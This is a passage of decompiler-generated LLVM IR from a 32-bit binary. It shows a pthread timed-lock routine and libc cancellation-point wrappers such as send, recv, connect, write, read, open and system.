  uselistorder i1 %v15_804cf1e, { 1, 2, 0 }
  uselistorder i32 %v2_804cf1e, { 1, 0 }
  uselistorder i1 %v15_804cefe, { 1, 2, 0 }
  uselistorder i32 %v2_804cefe, { 1, 0 }
  uselistorder i32 %v1_804ceeb, { 1, 0 }
  uselistorder i32 %v1_804cee5, { 1, 0 }
  uselistorder i32 %stack_var_-32.111, { 1, 0 }
  uselistorder i32 %v1_804cec3, { 1, 0, 2, 3 }
  uselistorder i32* %v1_804ceba, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_804ceaf, { 2, 0, 1, 3 }
  uselistorder i1 %v15_804ceaf, { 1, 2, 0 }
  uselistorder i32 %v2_804ceaf, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 ()* @restart.3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cf29, { 1, 0 }
  uselistorder label %dec_label_pc_804cef6, { 1, 0 }
  uselistorder label %dec_label_pc_804cee5, { 1, 0 }
  uselistorder label %dec_label_pc_804ced6, { 1, 0 }
  uselistorder label %dec_label_pc_804ceba.backedge, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_8063388.171 to i32), i32* @eax, align 4
  %v0_804cf48 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804cf4b = load i32, i32* @ebx, align 4
  store i32 %v0_804cf4b, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_804cf57 = call i32 @__pthread_acquire(i32 %v0_804cf4b)
  %v0_804cf5c = load i32, i32* @global_var_8063384.172, align 4
  %v1_804cf61 = icmp eq i32 %v0_804cf5c, 0
  br i1 %v1_804cf61, label %entry.dec_label_pc_804cf6e_crit_edge, label %dec_label_pc_804cf65

entry.dec_label_pc_804cf6e_crit_edge:             ; preds = %entry
  %v0_804cf78.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cf6e

dec_label_pc_804cf65:                             ; preds = %entry
  store i32 %v0_804cf5c, i32* @esi, align 4
  %v1_804cf67 = inttoptr i32 %v0_804cf5c to i32*
  %v2_804cf67 = load i32, i32* %v1_804cf67, align 4
  store i32 %v2_804cf67, i32* @global_var_8063384.172, align 4
  br label %dec_label_pc_804cf6e

dec_label_pc_804cf6e:                             ; preds = %entry.dec_label_pc_804cf6e_crit_edge, %dec_label_pc_804cf65
  %v0_804cf78 = phi i32 [ %v0_804cf78.pre, %entry.dec_label_pc_804cf6e_crit_edge ], [ %v0_804cf5c, %dec_label_pc_804cf65 ]
  store i32 0, i32* @global_var_8063388.171, align 8
  %v1_804cf78 = icmp eq i32 %v0_804cf78, 0
  %v1_804cf7a = icmp eq i1 %v1_804cf78, false
  br i1 %v1_804cf7a, label %dec_label_pc_804cfa2, label %dec_label_pc_804cf7c

dec_label_pc_804cf7c:                             ; preds = %dec_label_pc_804cf6e
  store i32 12, i32* %stack_var_-44, align 4
  %v1_804cf81 = call i32 @malloc(i32 12)
  %v1_804cf89 = icmp eq i32 %v1_804cf81, 0
  store i32 %v1_804cf81, i32* @esi, align 4
  %v1_804cf8d = icmp eq i1 %v1_804cf89, false
  br i1 %v1_804cf8d, label %dec_label_pc_804cfa2, label %dec_label_pc_804cf8f

dec_label_pc_804cf8f:                             ; preds = %dec_label_pc_804cf7c
  %v0_804cf92 = load i32, i32* @edi, align 4
  store i32 %v0_804cf92, i32* %stack_var_-44, align 4
  %v3_804cf93 = inttoptr i32 %v0_804cf92 to i32*
  %v4_804cf93 = call i32 @__pthread_alt_lock(i32* %v3_804cf93, i32 %v1_804cf81, i32 %v1_804cf81)
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d008

dec_label_pc_804cfa2:                             ; preds = %dec_label_pc_804cf7c, %dec_label_pc_804cf6e, %dec_label_pc_804cfbd
  %v0_804cfa2 = load i32, i32* @edi, align 4
  %v1_804cfa2 = inttoptr i32 %v0_804cfa2 to i32*
  %v2_804cfa2 = load i32, i32* %v1_804cfa2, align 4
  store i32 %v2_804cfa2, i32* @ebx, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804cfa9 = icmp eq i32 %v2_804cfa2, 0
  br i1 %v1_804cfa9, label %dec_label_pc_804cfa2.dec_label_pc_804cfbd_crit_edge, label %dec_label_pc_804cfad

dec_label_pc_804cfa2.dec_label_pc_804cfbd_crit_edge: ; preds = %dec_label_pc_804cfa2
  %v0_804cfbd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cfbd

dec_label_pc_804cfad:                             ; preds = %dec_label_pc_804cfa2
  %v0_804cfad = load i32, i32* @ebp, align 4
  %v1_804cfad = icmp eq i32 %v0_804cfad, 0
  %v1_804cfaf = icmp eq i1 %v1_804cfad, false
  br i1 %v1_804cfaf, label %dec_label_pc_804cfb8, label %dec_label_pc_804cfb1

dec_label_pc_804cfb1:                             ; preds = %dec_label_pc_804cfad
  %v0_804cfb1 = call i32 @thread_self.4()
  store i32 %v0_804cfb1, i32* @ebp, align 4
  br label %dec_label_pc_804cfb8

dec_label_pc_804cfb8:                             ; preds = %dec_label_pc_804cfad, %dec_label_pc_804cfb1
  %v0_804cfb8 = phi i32 [ %v0_804cfad, %dec_label_pc_804cfad ], [ %v0_804cfb1, %dec_label_pc_804cfb1 ]
  %v1_804cfb8 = load i32, i32* @esi, align 4
  %v2_804cfb8 = add i32 %v1_804cfb8, 4
  %v3_804cfb8 = inttoptr i32 %v2_804cfb8 to i32*
  store i32 %v0_804cfb8, i32* %v3_804cfb8, align 4
  %v0_804cfbb = load i32, i32* @esi, align 4
  store i32 %v0_804cfbb, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cfbd

dec_label_pc_804cfbd:                             ; preds = %dec_label_pc_804cfa2.dec_label_pc_804cfbd_crit_edge, %dec_label_pc_804cfb8
  %v0_804cfbd = phi i32 [ %v0_804cfbd.pre, %dec_label_pc_804cfa2.dec_label_pc_804cfbd_crit_edge ], [ %v0_804cfbb, %dec_label_pc_804cfb8 ]
  %v1_804cfbd = add i32 %v0_804cfbd, 8
  %v2_804cfbd = inttoptr i32 %v1_804cfbd to i32*
  store i32 0, i32* %v2_804cfbd, align 4
  %v1_804cfc4 = load i32, i32* @esi, align 4
  %v2_804cfc4 = inttoptr i32 %v1_804cfc4 to i32*
  store i32 %v2_804cfa2, i32* %v2_804cfc4, align 4
  %v0_804cfc8 = load i32, i32* @edi, align 4
  %v1_804cfc8 = inttoptr i32 %v0_804cfc8 to i32*
  %v2_804cfc8 = load i32, i32* %v1_804cfc8, align 4
  %v3_804cfc8 = load i32, i32* %edx.global-to-local, align 4
  %v15_804cfc8 = icmp eq i32 %v2_804cfa2, %v2_804cfc8
  %v22_804cfc8 = select i1 %v15_804cfc8, i32 %v3_804cfc8, i32 %v2_804cfc8
  store i32 %v22_804cfc8, i32* %v1_804cfc8, align 4
  %v1_804cfcc = zext i1 %v15_804cfc8 to i32
  %v2_804cfcc = load i32, i32* %edx.global-to-local, align 4
  %v3_804cfcc = and i32 %v2_804cfcc, -256
  %v4_804cfcc = or i32 %v3_804cfcc, %v1_804cfcc
  store i32 %v4_804cfcc, i32* @edx, align 4
  %v4_804cfcf = icmp eq i1 %v15_804cfc8, false
  br i1 %v4_804cfcf, label %dec_label_pc_804cfa2, label %dec_label_pc_804cfd3

dec_label_pc_804cfd3:                             ; preds = %dec_label_pc_804cfbd
  br i1 %v1_804cfa9, label %dec_label_pc_804cffc, label %dec_label_pc_804cfd7

dec_label_pc_804cfd7:                             ; preds = %dec_label_pc_804cfd3
  %v0_804cfd7 = load i32, i32* @edi, align 4
  %v0_804cfdd = load i32, i32* @ebp, align 4
  store i32 %v0_804cfdd, i32* %stack_var_-44, align 4
  %v3_804cfde = inttoptr i32 %v0_804cfd7 to i32*
  %v4_804cfde = call i32 @__pthread_timedsuspend_new(i32 %arg3, i32* %v3_804cfde, i32 %v0_804cfd7)
  %v1_804cfe6 = icmp eq i32 %v4_804cfde, 0
  %v1_804cfe8 = icmp eq i1 %v1_804cfe6, false
  br i1 %v1_804cfe8, label %dec_label_pc_804cffc, label %dec_label_pc_804cfea

dec_label_pc_804cfea:                             ; preds = %dec_label_pc_804cfd7
  %v1_804cfea = and i32 %v4_804cfde, -256
  %v2_804cfea = or i32 %v1_804cfea, 1
  %v0_804cfec = load i32, i32* @esi, align 4
  %v1_804cfec = add i32 %v0_804cfec, 8
  %v2_804cfec = inttoptr i32 %v1_804cfec to i32*
  %v3_804cfec = load i32, i32* %v2_804cfec, align 4
  store i32 %v2_804cfea, i32* %v2_804cfec, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804cff1 = icmp eq i32 %v3_804cfec, 0
  br i1 %v1_804cff1, label %dec_label_pc_804d008, label %dec_label_pc_804cff5

dec_label_pc_804cff5:                             ; preds = %dec_label_pc_804cfea
  %v0_804cff5 = load i32, i32* @ebp, align 4
  store i32 %v0_804cff5, i32* @eax, align 4
  %v0_804cff7 = load i32, i32* %stack_var_-44, align 4
  %v2_804cff7 = call i32 @suspend.5(i32 %v0_804cff7, i32 %arg3)
  br label %dec_label_pc_804cffc

dec_label_pc_804cffc:                             ; preds = %dec_label_pc_804cfd7, %dec_label_pc_804cfd3, %dec_label_pc_804cff5
  %v0_804cffc = load i32, i32* @esi, align 4
  store i32 %v0_804cffc, i32* @eax, align 4
  %v0_804cffe = call i32 @wait_node_free()
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d008

dec_label_pc_804d008:                             ; preds = %dec_label_pc_804cfea, %dec_label_pc_804cf8f, %dec_label_pc_804cffc
  %v0_804d00b = phi i32 [ 0, %dec_label_pc_804cfea ], [ 1, %dec_label_pc_804cf8f ], [ 1, %dec_label_pc_804cffc ]
  %v2_804d00d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d00d, i32* @ebx, align 4
  store i32 %v0_804cf48, i32* @esi, align 4
  ret i32 %v0_804d00b

; uselistorder directives
  uselistorder i32 %v4_804cfde, { 1, 0 }
  uselistorder i1 %v15_804cfc8, { 1, 2, 0 }
  uselistorder i32 %v2_804cfc8, { 1, 0 }
  uselistorder i32 %v0_804cf5c, { 0, 2, 1, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32 ()* @wait_node_free, { 1, 0 }
  uselistorder i32 (i32, i32)* @suspend.5, { 3, 1, 0, 2 }
  uselistorder i32 ()* @thread_self.4, { 2, 0, 1 }
  uselistorder i32 (i32)* @__pthread_acquire, { 1, 0 }
  uselistorder label %dec_label_pc_804d008, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cffc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cfbd, { 1, 0 }
  uselistorder label %dec_label_pc_804cfb8, { 1, 0 }
  uselistorder label %dec_label_pc_804cfa2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cf6e, { 1, 0 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d014 = load i32, i32* @ebx, align 4
  store i32 %v0_804d014, i32* %stack_var_-4, align 4
  %v2_804d018 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d01f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d018)
  %v6_804d03e = call i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  %v3_804d048 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_804d03e, i32* @ebx, align 4
  %v2_804d04e = trunc i32 %v3_804d048 to i8
  %v3_804d04e = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d04e, i32 0)
  %v0_804d056 = load i32, i32* @ebx, align 4
  %v2_804d058 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d058, i32* @ebx, align 4
  ret i32 %v0_804d056
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d05e = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d065 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d05e)
  %v3_804d079 = call i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_804d079, i32* @ebx, align 4
  %v3_804d084 = load i32, i32* %stack_var_-8, align 4
  %v2_804d088 = trunc i32 %v3_804d084 to i8
  %v3_804d088 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d088, i32 0)
  %v0_804d090 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d090
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d098 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d09f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d098)
  %v4_804d0b4 = call i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_804d0be = load i32, i32* %stack_var_-8, align 4
  store i32 %v4_804d0b4, i32* @ebx, align 4
  %v2_804d0c4 = trunc i32 %v3_804d0be to i8
  %v3_804d0c4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d0c4, i32 0)
  %v0_804d0cc = load i32, i32* @ebx, align 4
  ret i32 %v0_804d0cc
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d0d4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d0db = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d0d4)
  %v3_804d0ef = call i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_804d0ef, i32* @ebx, align 4
  %v3_804d0fa = load i32, i32* %stack_var_-8, align 4
  %v2_804d0fe = trunc i32 %v3_804d0fa to i8
  %v3_804d0fe = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d0fe, i32 0)
  %v0_804d106 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d106
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d10e = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d115 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d10e)
  store i32 %v2_804d10e, i32* @ebx, align 4
  %v6_804d134 = call i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  %v3_804d13e = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_804d134, i32* @ebx, align 4
  %v2_804d144 = trunc i32 %v3_804d13e to i8
  %v3_804d144 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d144, i32 0)
  %v0_804d14c = load i32, i32* @ebx, align 4
  ret i32 %v0_804d14c
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d150 = load i32, i32* @ebx, align 4
  store i32 %v0_804d150, i32* %stack_var_-4, align 4
  %v2_804d154 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d15b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d154)
  %v4_804d170 = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_804d17a = load i32, i32* %stack_var_-8, align 4
  store i32 %v4_804d170, i32* @ebx, align 4
  %v2_804d180 = trunc i32 %v3_804d17a to i8
  %v3_804d180 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d180, i32 0)
  %v0_804d188 = load i32, i32* @ebx, align 4
  %v2_804d18a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d18a, i32* @ebx, align 4
  ret i32 %v0_804d188
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d18c = load i32, i32* @ebx, align 4
  store i32 %v0_804d18c, i32* %stack_var_-4, align 4
  %v2_804d190 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d197 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d190)
  %v3_804d1ab = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_804d1ab, i32* @ebx, align 4
  %v3_804d1b6 = load i32, i32* %stack_var_-8, align 4
  %v2_804d1ba = trunc i32 %v3_804d1b6 to i8
  %v3_804d1ba = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d1ba, i32 0)
  %v0_804d1c2 = load i32, i32* @ebx, align 4
  %v2_804d1c4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d1c4, i32* @ebx, align 4
  ret i32 %v0_804d1c2
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d1c6 = load i32, i32* @ebx, align 4
  store i32 %v0_804d1c6, i32* %stack_var_-4, align 4
  %v2_804d1ca = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d1d1 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d1ca)
  %v3_804d1e5 = call i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_804d1e5, i32* @ebx, align 4
  %v3_804d1f0 = load i32, i32* %stack_var_-8, align 4
  %v2_804d1f4 = trunc i32 %v3_804d1f0 to i8
  %v3_804d1f4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d1f4, i32 0)
  %v0_804d1fc = load i32, i32* @ebx, align 4
  %v2_804d1fe = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d1fe, i32* @ebx, align 4
  ret i32 %v0_804d1fc
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d200 = load i32, i32* @ebx, align 4
  store i32 %v0_804d200, i32* %stack_var_-4, align 4
  %v2_804d204 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d20b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d204)
  %v3_804d21f = call i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_804d21f, i32* @ebx, align 4
  %v3_804d22a = load i32, i32* %stack_var_-8, align 4
  %v2_804d22e = trunc i32 %v3_804d22a to i8
  %v3_804d22e = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d22e, i32 0)
  %v0_804d236 = load i32, i32* @ebx, align 4
  %v2_804d238 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d238, i32* @ebx, align 4
  ret i32 %v0_804d236
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d23a = load i32, i32* @ebx, align 4
  store i32 %v0_804d23a, i32* %stack_var_-4, align 4
  %v2_804d23e = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d245 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d23e)
  %v3_804d259 = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_804d259, i32* @ebx, align 4
  %v3_804d264 = load i32, i32* %stack_var_-8, align 4
  %v2_804d268 = trunc i32 %v3_804d264 to i8
  %v3_804d268 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d268, i32 0)
  %v0_804d270 = load i32, i32* @ebx, align 4
  %v2_804d272 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d272, i32* @ebx, align 4
  ret i32 %v0_804d270
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d278 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d27f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d278)
  %v1_804d289 = call i32 @__libc_wait(i32 %arg1)
  store i32 %v1_804d289, i32* @ebx, align 4
  %v3_804d294 = load i32, i32* %stack_var_-8, align 4
  %v2_804d298 = trunc i32 %v3_804d294 to i8
  %v3_804d298 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d298, i32 0)
  %v0_804d2a0 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d2a0
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d2a8 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d2af = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d2a8)
  %v1_804d2b9 = call i32 @__libc_tcdrain(i32 %arg1)
  store i32 %v1_804d2b9, i32* @ebx, align 4
  %v3_804d2c4 = load i32, i32* %stack_var_-8, align 4
  %v2_804d2c8 = trunc i32 %v3_804d2c4 to i8
  %v3_804d2c8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d2c8, i32 0)
  %v0_804d2d0 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d2d0
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d2d8 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d2df = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d2d8)
  store i32 1, i32* @ecx, align 4
  %v1_804d2e9 = call i32 @__libc_system(i32 %arg1)
  store i32 %v1_804d2e9, i32* @ebx, align 4
  %v3_804d2f4 = load i32, i32* %stack_var_-8, align 4
  %v2_804d2f8 = trunc i32 %v3_804d2f4 to i8
  %v3_804d2f8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d2f8, i32 0)
  %v0_804d300 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d300
}

define i32 @read(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804d308 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d30f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d308)
  %v3_804d323 = call i32 @__libc_read(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_804d323, i32* @ebx, align 4
  %v3_804d32e = load i32, i32* %stack_var_-8, align 4
  %v2_804d332 = trunc i32 %v3_804d32e to i8
  %v3_804d332 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d332, i32 0)
  %v0_804d33a = load i32, i32* @ebx, align 4
  ret i32 %v0_804d33a
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d342 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d349 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d342)
  %v4_804d35e = call i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_804d368 = load i32, i32* %stack_var_-8, align 4
  store i32 %v4_804d35e, i32* @ebx, align 4
  %v2_804d36e = trunc i32 %v3_804d368 to i8
  %v3_804d36e = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d36e, i32 0)
  %v0_804d376 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d376
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg5, i32* @esi, align 4
  %v2_804d383 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg4, i32* @ebx, align 4
  %v3_804d38e = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d383)
  %v0_804d393 = load i32, i32* @esi, align 4
  %v0_804d396 = load i32, i32* @ebx, align 4
  %v5_804d3a3 = call i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v0_804d396, i32 %v0_804d393)
  %v3_804d3ad = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_804d3a3, i32* @ebx, align 4
  %v2_804d3b3 = trunc i32 %v3_804d3ad to i8
  %v3_804d3b3 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d3b3, i32 0)
  %v0_804d3bb = load i32, i32* @ebx, align 4
  ret i32 %v0_804d3bb
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d3c4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d3cb = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d3c4)
  %v4_804d3e0 = call i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_804d3ea = load i32, i32* %stack_var_-8, align 4
  store i32 %v4_804d3e0, i32* @ebx, align 4
  %v2_804d3f0 = trunc i32 %v3_804d3ea to i8
  %v3_804d3f0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d3f0, i32 0)
  %v0_804d3f8 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d3f8
}

define i32 @pause(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d400 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d407 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d400)
  %v0_804d40c = call i32 @__libc_pause()
  store i32 1, i32* @ecx, align 4
  store i32 %v0_804d40c, i32* @ebx, align 4
  %v3_804d417 = load i32, i32* %stack_var_-8, align 4
  %v2_804d41b = trunc i32 %v3_804d417 to i8
  %v3_804d41b = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d41b, i32 0)
  %v0_804d423 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d423
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d42b = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d432 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d42b)
  %v3_804d44e = trunc i32 %arg2 to i8
  %v4_804d44e = call i32 @__GI___libc_open64(i32 %arg1, i8 %v3_804d44e, i32 %arg3)
  store i32 %v4_804d44e, i32* @ebx, align 4
  %v3_804d459 = load i32, i32* %stack_var_-8, align 4
  %v2_804d45d = trunc i32 %v3_804d459 to i8
  %v3_804d45d = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d45d, i32 0)
  %v0_804d465 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d465
}

define i32 @open(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804d46d = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d474 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d46d)
  %v3_804d490 = trunc i32 %tmp1 to i8
  %v4_804d490 = call i32 @__libc_open(i32 %arg1, i8 %v3_804d490, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v4_804d490, i32* @ebx, align 4
  %v3_804d49b = load i32, i32* %stack_var_-8, align 4
  %v2_804d49f = trunc i32 %v3_804d49b to i8
  %v3_804d49f = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d49f, i32 0)
  %v0_804d4a7 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d4a7
}

define i32 @nanosleep(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d4ab = load i32, i32* @ebx, align 4
  store i32 %v0_804d4ab, i32* %stack_var_-4, align 4
  %v2_804d4af = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d4b6 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d4af)
  store i32 %v2_804d4af, i32* @ebx, align 4
  %v2_804d4c5 = call i32 @__libc_nanosleep(i32 %arg1, i32 %arg2)
  store i32 %v2_804d4c5, i32* @ebx, align 4
  %v3_804d4d0 = load i32, i32* %stack_var_-8, align 4
  %v2_804d4d4 = trunc i32 %v3_804d4d0 to i8
  %v3_804d4d4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d4d4, i32 0)
  %v0_804d4dc = load i32, i32* @ebx, align 4
